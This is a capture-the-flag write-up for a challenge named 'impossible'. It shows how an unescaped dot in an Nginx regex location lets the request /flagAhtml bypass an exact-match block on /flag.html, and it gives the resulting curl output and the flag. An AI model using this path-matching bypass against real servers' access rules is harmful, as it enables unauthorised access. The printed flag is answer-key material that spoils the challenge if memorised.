# impossible

## Write-up

* Nginx configuration :  

```nginx
events {
}

http {
  server {
    listen 80;

    location = /flag.html {
      rewrite ^ /no_flag_for_you.html break;
    }

    location ~ ^/flag.html$ {
      rewrite ^ /flag.html break;
    }

    location = /alive {
      return 200;
    }
  }
}
```

* At first glance it looks impossible to get the flag because of this exact match location block :  

```nginx
location = /flag.html {
  rewrite ^ /no_flag_for_you.html break;
}
```

* But knowing about Nginx, the `~` in a location block means it's a regular expression match

* The regex we're dealing with is `^/flag.html$`, `^` means start of string and `$` means end of string

* But there is one more thing to notice : in regular expressions `.` matches any character, which ultimately means that, for example, `/flagAhtml` can pass the check and we get the flag

* Let's try it :  

```bash
curl http://127.0.0.1:3002/flagAhtml
```

* Output :  

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width-device-width, initial-scale=1.0" />
    <link href="https://unpkg.com/tailwindcss@^2/dist/tailwind.min.css" rel="stylesheet"/>
    <title>Impossible</title>
  </head>
  <body class="bg-gray-50">
    <header>
      <div class="flex flex-row bg-gray-100 px-5 py-2">
        <a href="/" class="hover:underline hover:text-blue-500 text-black py-1 px-4 font-bold">
          Impossible
        </a>
      </div>
    </header>

    <main>
      <div class="my-5 flex justify-center items-center relative z-20">
        <h1 class="text-black text-5xl font-bold">shellmates{R3gEX_IN_NGinx_g03S_BrrrR}</a>
      </div>
    </main>

  </body>
</html>
```

## Flag

`shellmates{R3gEX_IN_NGinx_g03S_BrrrR}`
